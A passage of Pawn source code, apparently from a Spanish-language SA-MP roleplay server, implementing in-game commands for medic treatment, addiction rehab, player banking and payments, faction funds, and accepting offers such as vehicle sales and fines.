		return SendClientMessage(playerid, COLOR_YELLOW2, "�Debes estar cerca del herido!");
  	if(GetPVarInt(target, "disabled") == DISABLE_DEATHBED)
  		return SendClientMessage(playerid, COLOR_YELLOW2, "El sujeto se encuentra en su lecho de muerte y no hay nada que puedas hacer por �l.");

	SendFMessage(target, COLOR_LIGHTBLUE, "El m�dico %s te ha ofrecido un tratamiento curativo por $%d. Escribe (/aceptar medico) para recibirlo.", GetPlayerNameEx(playerid), cost);
    SendClientMessage(target, COLOR_WHITE, "Si no tienes el dinero, se te cobrar� hasta lo que tengas, y el resto se descontar� de tu cuenta bancaria.");
 	SendFMessage(playerid, COLOR_LIGHTBLUE, "Le has ofrecido a %s un tratamiento curativo por $%d.", GetPlayerNameEx(target), cost);
	SetPVarInt(playerid, "healTarget", target);
	SetPVarInt(playerid, "isHealing", 1);
	SetPVarInt(target, "healIssuer", playerid);
	SetPVarInt(target, "healCost", cost);
	SetTimerEx("healTimer", 15000, false, "i", playerid);
	return 1;
}

CMD:rehabilitar(playerid, params[])
{
	new targetid;

	if(PlayerInfo[playerid][pFaction] != FAC_HOSP)
	    return 1;
    if(sscanf(params, "u", targetid))
		return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /rehabilitar [IDJugador/ParteDelNombre]");
	if(GetPlayerBuilding(playerid) != BLD_HOSP && GetPlayerBuilding(playerid) != BLD_HOSP2)
	    return SendClientMessage(playerid, COLOR_YELLOW2, "�Debes estar en el hospital!");
 	if(!MedDuty[playerid])
		return SendClientMessage(playerid, COLOR_YELLOW2, "�Debes estar en servicio!");
	if(targetid == INVALID_PLAYER_ID || targetid == playerid)
		return SendClientMessage(playerid, COLOR_YELLOW2, "Jugador inv�lido.");
	if(RehabOffer[targetid] != 999)
	    return SendClientMessage(playerid, COLOR_YELLOW2, "El sujeto ya est� con otro tratamiento en curso.");
	if(GetPlayerAdiction(targetid) == 0)
	    return SendClientMessage(playerid, COLOR_YELLOW2, "El sujeto no parece tener problemas de adicci�n.");
	if(GetPlayerCash(targetid) < ADICTION_REHAB_PRICE)
	{
	    SendFMessage(playerid, COLOR_YELLOW2, "El sujeto no tiene el dinero necesario para la rehabilitaci�n. ($%d)", ADICTION_REHAB_PRICE);
		return 1;
	}

    SendFMessage(targetid, COLOR_LIGHTBLUE, "El m�dico %s te ofrece una rehabilitaci�n con $%d de costo. Tipea /rehabilitarse si quieres. La oferta acaba en 15 segundos.", GetPlayerNameEx(playerid), ADICTION_REHAB_PRICE);
	SendFMessage(playerid, COLOR_LIGHTBLUE, "Le has ofrecido a %s un tratamiento de rehabilitaci�n cuyo costo es de $%d. La oferta termina en 15 segundos.", GetPlayerNameEx(targetid), ADICTION_REHAB_PRICE);
	RehabOffer[targetid] = playerid;
	SetTimerEx("RehabOfferCancel", 15000, false, "i", targetid);
	return 1;
}

forward RehabOfferCancel(playerid);
public RehabOfferCancel(playerid)
{
    RehabOffer[playerid] = 999;
}

CMD:rehabilitarse(playerid, params[])
{
	new aleatorio = random(100);

	if(RehabOffer[playerid] == 999)
		return SendClientMessage(playerid, COLOR_YELLOW2, "Nadie te ha ofrecido un tratamiento de rehabilitaci�n.");
 	if(RehabOffer[playerid] == INVALID_PLAYER_ID)
		return SendClientMessage(playerid, COLOR_YELLOW2, "Jugador inv�lido.");
 	if(GetPlayerBuilding(playerid) != BLD_HOSP && GetPlayerBuilding(playerid) != BLD_HOSP2)
	   	return SendClientMessage(playerid, COLOR_YELLOW2, "�Ambos, medico y paciente, deben estar en el hospital!");
  	if(GetPlayerCash(playerid) < ADICTION_REHAB_PRICE)
    {
	   	SendFMessage(playerid, COLOR_YELLOW2, "No tienes el dinero necesario para la rehabilitaci�n. ($%d.-)", ADICTION_REHAB_PRICE);
		return 1;
	}

	if(aleatorio < 55)
	    DeletePlayerAdiction(playerid, GetPlayerAdiction(playerid) / 2); // 50 porciento de que baje a la mitad
	else
		if(aleatorio < 75)
	        DeletePlayerAdiction(playerid, (GetPlayerAdiction(playerid) / 10) * 9); // 25 porciento que baje 90 porciento
		else
		    if(aleatorio < 85)
		        DeletePlayerAdiction(playerid, 100.0); // 10 porciento de eliminar la adiccion
   			else
			    DeletePlayerAdiction(playerid, 0.0); // 15 porciento de que no pase nada
	PlayerActionMessage(playerid, 15.0, "es sometido a un tratamiento de rehabilitaci�n en la cl�nica, veremos como responde ante este.");
    SendClientMessage(RehabOffer[playerid], COLOR_YELLOW2, "Una parte del dinero del paciente te ser� pagado en la siguiente hora, y otra parte ir� al fondo del hospital.");
	GivePlayerCash(playerid, -ADICTION_REHAB_PRICE);
 	PlayerInfo[RehabOffer[playerid]][pPayCheck] += ADICTION_REHAB_PRICE / 4;
 	GiveFactionMoney(FAC_HOSP, ADICTION_REHAB_PRICE / 4);
	return 1;
}

//==============================MANEJO DE DINERO================================

CMD:pagar(playerid,params[])
{
	new targetID, name[32], string[128], amount;

    if(sscanf(params, "ud", targetID, amount))
        return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /pagar [ID/Jugador] [cantidad]");
    if(GetPlayerCash(playerid) < amount || amount < 1 || amount > 500000)
        return SendClientMessage(playerid, COLOR_YELLOW2, "�Cantidad de dinero inv�lida! aseg�rate de tener dicha suma y que sea de m�s de $0 y menos de $500,000).");
	if(targetID == INVALID_PLAYER_ID || targetID == playerid)
		return SendClientMessage(playerid, COLOR_YELLOW2, "Jugador inv�lido.");
    if(!ProxDetectorS(2.0, playerid, targetID))
        return SendClientMessage(playerid, COLOR_YELLOW2, "�Deben estar cerca!");
        
    GetPlayerName(targetID, name, 32);
	format(string, sizeof(string), "[PAGO] $%d a %s (DBID: %d)", amount, name, PlayerInfo[targetID][pID]);
  	log(playerid, LOG_MONEY, string);
	GivePlayerCash(playerid, -amount);
	GivePlayerCash(targetID, amount);
	SendFMessage(playerid, COLOR_WHITE, "Le has pagado $%d a %s.", amount, GetPlayerNameEx(targetID));
	SendFMessage(targetID, COLOR_WHITE, "%s te ha pagado $%d.", GetPlayerNameEx(playerid), amount);
	format(string, sizeof(string), "toma algo de dinero y se lo entrega a %s.", GetPlayerNameEx(targetID));
    PlayerActionMessage(playerid, 15.0, string);
    PlayerPlaySound(targetID, 1052, 0.0, 0.0, 0.0);
    PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
    return 1;
}

CMD:ayudacajero(playerid,params[])
{
	cmd_ayudabanco(playerid, params);
	return 1;
}

CMD:ayudabanco(playerid,params[])
{
	new string[128];

	if(PlayerInfo[playerid][pFaction] != 0)
	{
		if(PlayerInfo[playerid][pRank] == 1)
	    	format(string, sizeof(string), "- /fverbalance - /fdepositar - /fretirar");
    	else
    		format(string, sizeof(string), "- /fdepositar");
	}
    SendFMessage(playerid, COLOR_LIGHTYELLOW2, "[BANCO/CAJERO]: /verbalance - /depositar - /retirar - /transferir %s", string);
	return 1;
}

CMD:depositar(playerid,params[])
{
	new amount;

	if(!PlayerToPoint(5.0, playerid, POS_BANK_X, POS_BANK_Y, POS_BANK_Z) && !IsAtATM(playerid))
	    return SendClientMessage(playerid, COLOR_YELLOW2, "�Debes estar en un banco o cajero autom�tico!");
 	if(sscanf(params, "d", amount))
    	return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /depositar [cantidad]");
	if(GetPlayerCash(playerid) < amount || amount < 1)
	    return SendClientMessage(playerid, COLOR_YELLOW2, "�Cantidad de dinero inv�lida!");
	    
	GivePlayerCash(playerid, -amount);
	PlayerInfo[playerid][pBank] += amount;
	SendFMessage(playerid, COLOR_WHITE, "Has depositado $%d. Nuevo balance: $%d.", amount, PlayerInfo[playerid][pBank]);
 	PlayerActionMessage(playerid, 15.0, "toma una suma de dinero y la deposita en su cuenta.");
    return 1;
}

CMD:retirar(playerid,params[])
{
	new amount;
	
	if(!PlayerToPoint(5.0, playerid, POS_BANK_X, POS_BANK_Y, POS_BANK_Z) && !IsAtATM(playerid))
	    return SendClientMessage(playerid, COLOR_YELLOW2, "�Debes estar en un banco o cajero autom�tico!");
 	if(sscanf(params, "d", amount))
    	return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /retirar [cantidad]");
	if(PlayerInfo[playerid][pBank] < amount || amount < 1)
	    return SendClientMessage(playerid, COLOR_YELLOW2, "�Cantidad de dinero inv�lida!");

	GivePlayerCash(playerid, amount);
	PlayerInfo[playerid][pBank] -= amount;
	SendFMessage(playerid, COLOR_WHITE, "Has retirado $%d. Nuevo balance: $%d.", amount, PlayerInfo[playerid][pBank]);
    PlayerActionMessage(playerid, 15.0, "retira una suma de dinero de su cuenta.");
    return 1;
}

CMD:transferir(playerid, params[])
{
	new targetID, name[32], string[128], amount;

	if(!PlayerToPoint(5.0, playerid, POS_BANK_X, POS_BANK_Y, POS_BANK_Z) && !IsAtATM(playerid))
	    return SendClientMessage(playerid, COLOR_YELLOW2, "�Debes estar en un banco o cajero autom�tico!");
	if(sscanf(params, "ud", targetID, amount))
 		return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /transferir [ID/Jugador] [cantidad]");
    if(PlayerInfo[playerid][pBank] < amount || amount < 1)
  		return SendClientMessage(playerid, COLOR_YELLOW2, "�Cantidad de dinero inv�lida!");
	if(!IsPlayerConnected(targetID) || targetID == playerid)
		return SendClientMessage(playerid, COLOR_YELLOW2, "Jugador inv�lido.");

	GetPlayerName(targetID, name, 32);
	format(string, sizeof(string), "[TRANSFER] $%d a %s (DBID: %d)", amount, name, PlayerInfo[targetID][pID]);
	log(playerid, LOG_MONEY, string);
	PlayerInfo[playerid][pBank] -= amount;
	PlayerInfo[targetID][pBank] += amount;
	SendFMessage(playerid, COLOR_WHITE, "Has realizado una transferencia de $%d a la cuenta de %s.", amount, GetPlayerNameEx(targetID));
	SendFMessage(targetID, COLOR_WHITE, "[Mensaje del Banco]: Has recibido una transferencia de la cuenta de %s por $%d.", GetPlayerNameEx(playerid), amount);
    PlayerActionMessage(playerid, 15.0, "aprieta algunos botones del cajero y realiza una operaci�n bancaria.");
 	return 1;
}

CMD:verbalance(playerid,params[])
{
	if(!PlayerToPoint(5.0, playerid, POS_BANK_X, POS_BANK_Y, POS_BANK_Z) && !IsAtATM(playerid))
	    return SendClientMessage(playerid, COLOR_YELLOW2, "�Debes estar en un banco o cajero autom�tico!");

	SendFMessage(playerid, COLOR_WHITE, "Tu balance actual es de $%d.", PlayerInfo[playerid][pBank]);
	PlayerActionMessage(playerid, 15.0, "recibe un papel con el estado de su cuenta bancaria.");
    return 1;
}

CMD:donar(playerid, params[])
{
	new money, str[128];
	
	if(sscanf(params, "i", money))
		return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /donar [cantidad]");
	if(money < 0)
	    return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{FF4600}[Error]:{C8C8C8} cantidad inv�lida.");
	if(GetPlayerCash(playerid) < money)
	    return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{FF4600}[Error]:{C8C8C8} no tienes esa cantidad.");
	    
	GivePlayerCash(playerid, -money);
	format(str, sizeof(str), "{878EE7}[INFO]:{C8C8C8} %s ha donado $%d.", GetPlayerNameEx(playerid), money);
	AdministratorMessage(COLOR_LIGHTYELLOW2, str, 1);
	format(str, sizeof(str), "[DONACION] $%d", money);
	log(playerid, LOG_MONEY, str);
	return 1;
}

//==========================MANEJO DE DINERO DE FACCION=========================

CMD:fverbalance(playerid,params[])
{
	if(!PlayerToPoint(5.0, playerid, POS_BANK_X, POS_BANK_Y, POS_BANK_Z) && !IsAtATM(playerid))
	    return SendClientMessage(playerid, COLOR_YELLOW2, "�Debes estar en un banco o cajero autom�tico!");
    if(PlayerInfo[playerid][pFaction] == 0)
        return SendClientMessage(playerid, COLOR_YELLOW2, "�No perteneces a una facci�n!");
    if(PlayerInfo[playerid][pRank] != 1)
        return SendClientMessage(playerid, COLOR_YELLOW2, "�No tienes el rango suficiente!");

	SendFMessage(playerid, COLOR_WHITE, "El balance actual de la cuenta compartida es de $%d.", GetFactionMoney(PlayerInfo[playerid][pFaction]));
	PlayerActionMessage(playerid, 15.0, "recibe un papel con el estado de su cuenta bancaria.");
    return 1;
}

CMD:fdepositar(playerid,params[])
{
	new string[128], amount;
	
	if(!PlayerToPoint(5.0, playerid, POS_BANK_X, POS_BANK_Y, POS_BANK_Z) && !IsAtATM(playerid))
	    return SendClientMessage(playerid, COLOR_YELLOW2, "�Debes estar en un banco o cajero autom�tico!");
    if(PlayerInfo[playerid][pFaction] == 0)
        return SendClientMessage(playerid, COLOR_YELLOW2, "�No perteneces a una facci�n!");
 	if(sscanf(params, "d", amount))
  		return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /fdepositar [cantidad]");
 	if(GetPlayerCash(playerid) < amount || amount < 1)
 	    return SendClientMessage(playerid, COLOR_YELLOW2, "�Cantidad de dinero inv�lida!");
 	    
	GivePlayerCash(playerid, -amount);
	GiveFactionMoney(PlayerInfo[playerid][pFaction], amount);
	format(string, sizeof(string), "Has depositado $%d en la cuenta compartida, nuevo balance: $%d.", amount, GetFactionMoney(PlayerInfo[playerid][pFaction]));
	SendClientMessage(playerid, COLOR_WHITE, string);
	format(string, sizeof(string), "[DEPOSITO FAC] $%d a %s", amount, FactionInfo[PlayerInfo[playerid][pFaction]][fName]);
	log(playerid, LOG_MONEY, string);
 	PlayerActionMessage(playerid, 15.0, "toma una suma de dinero y la deposita en su cuenta.");
    return 1;
}

CMD:fretirar(playerid,params[])
{
	new string[128], amount;

	if(!PlayerToPoint(5.0, playerid, POS_BANK_X, POS_BANK_Y, POS_BANK_Z) && !IsAtATM(playerid))
	    return SendClientMessage(playerid, COLOR_YELLOW2, "�Debes estar en un banco o cajero autom�tico!");
 	if(sscanf(params, "d", amount))
  		return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /fretirar [cantidad]");
    if(PlayerInfo[playerid][pFaction] == 0)
        return SendClientMessage(playerid, COLOR_YELLOW2, "�No perteneces a una facci�n!");
	if(FactionInfo[PlayerInfo[playerid][pFaction]][fType] != FAC_TYPE_GOV)
	    return SendClientMessage(playerid, COLOR_YELLOW2, "No tiene permiso para retirar dinero de una facci�n gubernamental.");
    if(PlayerInfo[playerid][pRank] != 1)
        return SendClientMessage(playerid, COLOR_YELLOW2, "�No tienes el rango suficiente!");
 	if(GetFactionMoney(PlayerInfo[playerid][pFaction]) < amount || amount < 1)
 	    return SendClientMessage(playerid, COLOR_YELLOW2, "�Cantidad de dinero inv�lida!");
 	    
	GivePlayerCash(playerid, amount);
	GiveFactionMoney(PlayerInfo[playerid][pFaction], -amount);
	format(string, sizeof(string), "Has retirado $%d de la cuenta compartida, nuevo balance: $%d.", amount, GetFactionMoney(PlayerInfo[playerid][pFaction]));
	SendClientMessage(playerid, COLOR_WHITE, string);
    PlayerActionMessage(playerid, 15.0, "retira una suma de dinero de su cuenta.");
    return 1;
}

TIMER:CancelVehicleTransfer(playerid, timer) {
	if(timer == 1) {
		SendClientMessage(playerid, COLOR_LIGHTBLUE, "La venta ha sido cancelada ya que no has respondido en 30 segundos.");
		SendClientMessage(VehicleOffer[playerid], COLOR_LIGHTBLUE, "La venta ha sido cancelada ya que el comprador no ha respondido en 30 segundos.");
	} else if(timer == 0) {
    	SendClientMessage(playerid, COLOR_LIGHTBLUE, "Has rechazado la oferta.");
		SendFMessage(VehicleOffer[playerid], COLOR_LIGHTBLUE, "%s ha rechazado la oferta.", GetPlayerNameEx(playerid));
	}
	OfferingVehicle[VehicleOffer[playerid]] = false;
	VehicleOfferPrice[playerid] = -1;
	VehicleOffer[playerid] = INVALID_PLAYER_ID;
	VehicleOfferID[playerid] = -1;
	return 1;
}


CMD:aceptar(playerid,params[]) {
	new
		text[128],
		string[128];

	if(sscanf(params, "s[64]", text)) {
		SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /aceptar [comando]");
		
    } else if(strcmp(text,"droga",true) == 0) {
        if(DrugOffer[playerid] == INVALID_PLAYER_ID)
            return SendClientMessage(playerid, COLOR_YELLOW2, "Nadie te ha ofrecido droga.");
		if(GetDistanceBetweenPlayers(playerid, DrugOffer[playerid]) > 4.0)
			return SendClientMessage(playerid, COLOR_YELLOW2, "La persona se encuentra demasiado lejos.");
		if(!IsPlayerConnected(DrugOffer[playerid])) {
		    KillTimer(GetPVarInt(playerid, "CancelDrugTransfer"));
		    CancelDrugTransfer(playerid, 0);
			return SendClientMessage(playerid, COLOR_YELLOW2, "El jugador se ha desconectado.");
		}

        switch(DrugOfferType[playerid])
		{
			case 1:
			{
   				if(PlayerInfo[DrugOffer[playerid]][pMarijuana] < DrugOfferAmount[playerid])
			    	return SendClientMessage(playerid, COLOR_YELLOW2, "El sujeto ya no tiene esa cantidad.");
				PlayerInfo[playerid][pMarijuana] += DrugOfferAmount[playerid];
				PlayerInfo[DrugOffer[playerid]][pMarijuana] -= DrugOfferAmount[playerid];
			}
			case 2:
			{
			    if(PlayerInfo[DrugOffer[playerid]][pLSD] < DrugOfferAmount[playerid])
			    	return SendClientMessage(playerid, COLOR_YELLOW2, "El sujeto ya no tiene esa cantidad.");
            	PlayerInfo[playerid][pLSD] += DrugOfferAmount[playerid];
				PlayerInfo[DrugOffer[playerid]][pLSD] -= DrugOfferAmount[playerid];
			}
			case 3:
			{
			    if(PlayerInfo[DrugOffer[playerid]][pEcstasy] < DrugOfferAmount[playerid])
			    	return SendClientMessage(playerid, COLOR_YELLOW2, "El sujeto ya no tiene esa cantidad.");
                PlayerInfo[playerid][pEcstasy] += DrugOfferAmount[playerid];
				PlayerInfo[DrugOffer[playerid]][pEcstasy] -= DrugOfferAmount[playerid];
			}
			case 4:
			{
			    if(PlayerInfo[DrugOffer[playerid]][pCocaine] < DrugOfferAmount[playerid])
			    	return SendClientMessage(playerid, COLOR_YELLOW2, "El sujeto ya no tiene esa cantidad.");
                PlayerInfo[playerid][pCocaine] += DrugOfferAmount[playerid];
				PlayerInfo[DrugOffer[playerid]][pCocaine] -= DrugOfferAmount[playerid];
			}
			default: {
			    KillTimer(GetPVarInt(playerid, "CancelDrugTransfer"));
		    	CancelDrugTransfer(playerid, 0);
		    	SendClientMessage(DrugOffer[playerid], COLOR_YELLOW2, "Hubo un error con la transacci�n, cancelando...");
				return SendClientMessage(playerid, COLOR_YELLOW2, "Hubo un error con la transacci�n, cancelando...");
			}
		}
		format(string, sizeof(string), "agarra un paquete desconocido que le da %s y lo guarda disimuladamente en su bolsillo.", GetPlayerNameEx(DrugOffer[playerid]) );
        PlayerActionMessage(playerid, 8.0, string);
		KillTimer(GetPVarInt(playerid, "CancelDrugTransfer"));
		CancelDrugTransfer(playerid, 0);

 	} else if(strcmp(text,"vehiculo",true) == 0) {
    
        if(VehicleOffer[playerid] == INVALID_PLAYER_ID)
            return SendClientMessage(playerid, COLOR_YELLOW2, "Nadie te ha ofrecido ning�n veh�culo.");
		if(GetDistanceBetweenPlayers(playerid, VehicleOffer[playerid]) > 4.0)
			return SendClientMessage(playerid, COLOR_YELLOW2, "La persona se encuentra demasiado lejos.");
		if(!IsPlayerConnected(VehicleOffer[playerid])) {
		    KillTimer(GetPVarInt(playerid, "CancelVehicleTransfer"));
		    CancelVehicleTransfer(playerid, 0);
			return SendClientMessage(playerid, COLOR_YELLOW2, "El vendedor se ha desconectado.");
		}
		// Comprobamos que la ID del veh�culo sea v�lida y que el jugador no se haya desconectado.
		if(VehicleOfferID[playerid] <= 0 || !OfferingVehicle[VehicleOffer[playerid]]) {
			KillTimer(GetPVarInt(playerid, "CancelVehicleTransfer"));
            CancelVehicleTransfer(playerid, 0);
            SendClientMessage(VehicleOffer[playerid], COLOR_YELLOW2, "Debido a un error con la ID del veh�culo, la venta ha sido cancelada.");
            return SendClientMessage(playerid, COLOR_YELLOW2, "Error con la ID del veh�culo, cancelando...");
		}
		if(GetPlayerCash(playerid) < VehicleOfferPrice[playerid]) {
		    KillTimer(GetPVarInt(playerid, "CancelVehicleTransfer"));
		    CancelVehicleTransfer(playerid, 0);
		    SendClientMessage(VehicleOffer[playerid], COLOR_YELLOW2, "El jugador no tiene el dinero necesario, cancelando...");
		    return SendClientMessage(playerid, COLOR_YELLOW2, "No tienes el dinero suficiente, cancelando...");
		}
		
		if(getPlayerFreeKeySlots(playerid) > 0)
		{
			VehicleInfo[VehicleOfferID[playerid]][VehOwnerSQLID] = PlayerInfo[playerid][pID];
			GetPlayerName(playerid, VehicleInfo[VehicleOfferID[playerid]][VehOwnerName], 24);
			GivePlayerCash(playerid, -VehicleOfferPrice[playerid]);
			GivePlayerCash(VehicleOffer[playerid], VehicleOfferPrice[playerid]);
			// Le quitamos el veh�culo de la cuenta al vendedor.
			removeKeyFromPlayer(VehicleOffer[playerid],VehicleOfferID[playerid]);
			// Y a los que lo tienen prestado 
			deleteExtraKeysForCar(VehicleOfferID[playerid]);
			
            addKeyToPlayer(playerid,VehicleOfferID[playerid],playerid);
			PlayerPlayerActionMessage(VehicleOffer[playerid], playerid, 10.0, "recibe una suma de dinero y le entrega unas llaves a");
		    SendFMessage(playerid, COLOR_LIGHTBLUE, "�Felicidades, has comprado el %s por $%d!", GetVehicleName(VehicleOfferID[playerid]), VehicleOfferPrice[playerid]);
		    SendFMessage(VehicleOffer[playerid], COLOR_LIGHTBLUE, "�Felicitaciones, has vendido el %s por $%d!", GetVehicleName(VehicleOfferID[playerid]), VehicleOfferPrice[playerid]);
		    PlayerPlaySound(playerid, 1056, 0.0, 0.0, 0.0);
            SaveVehicle(VehicleOfferID[playerid]);
            new str[32];
            format(str, sizeof(str), "%d %d %d", playerid, VehicleOfferID[playerid], VehicleOfferPrice[playerid]);
            VehicleLog(VehicleOfferID[playerid], VehicleOffer[playerid], playerid, "/vehvendera", str);
		}
		else
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "No puedes tener m�s llaves en tu llavero, cancelando...");
		    SendClientMessage(VehicleOffer[playerid], COLOR_LIGHTBLUE, "El jugador no puede tener m�s llaves en su llavero, cancelando...");
		}
		KillTimer(GetPVarInt(playerid, "CancelVehicleTransfer"));
		CancelVehicleTransfer(playerid, 2);

	} else if(strcmp(text,"medico",true) == 0) {
 		if(GetPVarInt(GetPVarInt(playerid, "healIssuer"), "isHealing") == 1) {
			new medic = GetPVarInt(playerid, "healIssuer");
			new price = GetPVarInt(playerid, "healCost");
			new victimcash = GetPlayerCash(playerid);
			SetPlayerHealthEx(playerid, 100.00);
			/*TakeHeadShot[playerid] = 0;*/
			TogglePlayerControllable(playerid, true);
			PlayerPlaySound(playerid, 1150, 0.0, 0.0, 0.0);
			PlayerPlaySound(medic, 1150, 0.0, 0.0, 0.0);
			// El pago del medico puede debitarse del banco del herido en caso de no tener efectivo
   			if(victimcash > price)
   			{
				GivePlayerCash(playerid, -price);
				GivePlayerCash(medic, price); // Al ser pago en efectivo, el dinero se le da al medico en el momento
				SendFMessage(playerid, COLOR_LIGHTBLUE, "Has aceptado el tratamiento por $%d en efectivo.", price);
	        	SendFMessage(medic, COLOR_LIGHTBLUE, "El herido ha aceptado el tratamiento y te ha pagado $%d en efectivo.", price);
			}
			else
				if(victimcash > 0)
				{
				    if(PlayerInfo[playerid][pBank] > price - victimcash)
				    {
						PlayerInfo[playerid][pBank] -= price - victimcash; // Se le debita lo que le falta del banco
						PlayerInfo[medic][pPayCheck] += price - victimcash; // Esa parte que se debita le entra al banco mediante payday
					} else
					    if(PlayerInfo[playerid][pBank] > 0) // Esto es para que no saque plata del banco si no tiene
					    {
					        PlayerInfo[medic][pPayCheck] += PlayerInfo[playerid][pBank];
					        PlayerInfo[playerid][pBank] = 0;
						}
					GivePlayerCash(medic, victimcash); // La parte que se pag� en efectivo
				    ResetPlayerCash(playerid); // Todo lo que pudo pagar en efectivo
				    SendFMessage(playerid, COLOR_LIGHTBLUE, "Has aceptado el tratamiento por $%d. Una parte se descont� de tu cuenta bancaria al no tener todo en efectivo.", price);
     				SendFMessage(medic, COLOR_LIGHTBLUE, "El herido acept� tu tratamiento por $%d. Una parte la pag� v�a banco, y la cobraras en el pr�ximo Payday.", price);
				} else
				    {
				    	if(PlayerInfo[playerid][pBank] > price) // Esto es para que no saque plata del banco si no tiene
				    	{
							PlayerInfo[playerid][pBank] -= price; // Se le debita la totalidad del pago
	                        PlayerInfo[medic][pPayCheck] += price; // Y el medico lo cobra via banco con el payday
						} else
						    if(PlayerInfo[playerid][pBank] > 0) // Esto es para que no saque plata del banco si no tiene
						    {
		        				PlayerInfo[medic][pPayCheck] += PlayerInfo[playerid][pBank];
				        		PlayerInfo[playerid][pBank] = 0;
							}
				   		SendFMessage(playerid, COLOR_LIGHTBLUE, "Has aceptado el tratamiento por $%d. Como no ten�as efectivo, se descont� de tu cuenta bancaria.", price);
	        			SendFMessage(medic, COLOR_LIGHTBLUE, "El herido ha aceptado el tratamiento por $%d v�a banco, y lo cobraras en el pr�ximo Payday.", price);
					}
			SetPVarInt(GetPVarInt(playerid, "healIssuer"), "isHealing", 0);
   		} else {
			SendClientMessage(playerid, COLOR_YELLOW2, "�Ning�n m�dico te ha ofrecido tratamiento!");
		}
		
	} else if(strcmp(text,"faccion",true) == 0) {
	    new factionid = FactionRequest[playerid];
		if(factionid == 0)
			return SendClientMessage(playerid,COLOR_LIGHTYELLOW2,"{FF4600}[Error]:{C8C8C8} nadie te ha invitado a una facci�n.");
		if(PlayerInfo[playerid][pFaction] != 0)
			return SendClientMessage(playerid,COLOR_LIGHTYELLOW2,"{FF4600}[Error]:{C8C8C8} �ya te encuentras en una facci�n!, debes dejarla primero.");

		format(string, sizeof(string), "[Facci�n]: %s ha ingresado a la facci�n.",GetPlayerNameEx(playerid));
		SendFactionMessage(factionid, COLOR_FACTIONCHAT, string);
  		SendFMessage(playerid, COLOR_LIGHTBLUE, "{878EE7}[INFO]:{C8C8C8} �felicitaciones! ahora eres miembro de la facci�n: %s.",FactionInfo[factionid][fName]);
		SetPlayerFaction(playerid, factionid, FactionInfo[factionid][fJoinRank]);
		FactionRequest[playerid] = 0;
		
	}
	else if(strcmp(text,"multa",true) == 0)
	{
	    if(TicketOffer[playerid] >= 999)
		    return SendClientMessage(playerid, COLOR_YELLOW2, "�No tienes ninguna multa!");
      	if(!IsPlayerConnected(TicketOffer[playerid]))
      	    return SendClientMessage(playerid, COLOR_YELLOW2, "El oficial se ha desconectado.");
		if(!ProxDetectorS(5.0, playerid, TicketOffer[playerid]))
        	return SendClientMessage(playerid, COLOR_YELLOW2, "�Debes estar cerca del oficial que te ha multado!");
		if(GetPlayerCash(playerid) < TicketMoney[playerid])
		    return SendClientMessage(playerid, COLOR_YELLOW2, "�No tienes el dinero suficiente!");

		format(string, sizeof(string), "{878EE7}[INFO]:{C8C8C8} multa pagada - costo: $%d.", TicketMoney[playerid]);
		SendClientMessage(playerid, COLOR_WHITE, string);
		format(string, sizeof(string), "{878EE7}[INFO]:{C8C8C8} %s ha pagado tu multa - costo: $%d.", GetPlayerNameEx(playerid), TicketMoney[playerid]);
		SendClientMessage(TicketOffer[playerid], COLOR_LIGHTYELLOW2, string);
		GiveFactionMoney(FAC_GOB, TicketMoney[playerid]);
		GivePlayerCash(playerid, -TicketMoney[playerid]);
		TicketOffer[playerid] = 999;
		TicketMoney[playerid] = 0;
		return 1;
	}
	else if(strcmp(text,"mecanico",true) == 0) {
		if(PlayerInfo[playerid][pFaction] == FAC_MECH)
		{
			if(MechanicCallTime[playerid] > 0)
				return SendClientMessage(playerid, COLOR_YELLOW2, "�Ya est�s en una llamada!");
			if(MechanicCall == 999)
				return SendClientMessage(playerid, COLOR_YELLOW2, "�Nadie ha llamado a un mec�nico!");
			if(IsPlayerConnected(MechanicCall))
			{
			    new Float:x, Float:y, Float:z;
				SendClientMessage(playerid, COLOR_WHITE, "* Has aceptado la llamada de asistencia mec�nica. V� al punto rojo, tienes 90 segundos.");
				SendClientMessage(MechanicCall, COLOR_WHITE, "* Un mec�nico acept� su llamada, por favor aguarde en su posici�n actual.");
				format(string, sizeof(string), "* El mec�nico %s ha aceptado la ultima llamada de asistencia al taller.", GetPlayerNameEx(playerid));
				SendFactionMessage(FAC_MECH, COLOR_WHITE, string);
				GetPlayerPos(MechanicCall, x, y, z);
				SetPlayerCheckpoint(playerid, x, y, z, 5);
				GameTextForPlayer(playerid, "~w~Llamada de mecanico~n~~r~Dir�gete al marcador rojo", 5000, 1);
				MechanicCallTime[playerid] = 1;
				MechanicCall = 999;
				return 1;
			}
		}
		
	} else if(strcmp(text,"revision",true) == 0) {

		new idToShow = ReviseOffer[playerid];
		if(idToShow == 999)
			return SendClientMessage(playerid, COLOR_YELLOW2, "Nadie te quiere revisar.");
		if(!IsPlayerConnected(idToShow))
		    return SendClientMessage(playerid, COLOR_YELLOW2, "El sujeto se ha desconectado.");
		if(!ProxDetectorS(2.0, idToShow, playerid))
			return SendClientMessage(playerid, COLOR_YELLOW2, "El sujeto no est� cerca tuyo.");
			
		PrintHandsForPlayer(playerid, idToShow);
		PrintInvForPlayer(playerid, idToShow);
  		ShowPocket(idToShow, playerid);
  		PrintToysForPlayer(playerid, idToShow);
  		PrintBackForPlayer(playerid, idToShow);
		PlayerPlayerActionMessage(idToShow, playerid, 15.0, "ha revisado en busca de objetos a");
		ReviseOffer[playerid] = 999;
		return 1;

	} else if(strcmp(text,"taxi",true) == 0) {
	    new
			Float:ptX,
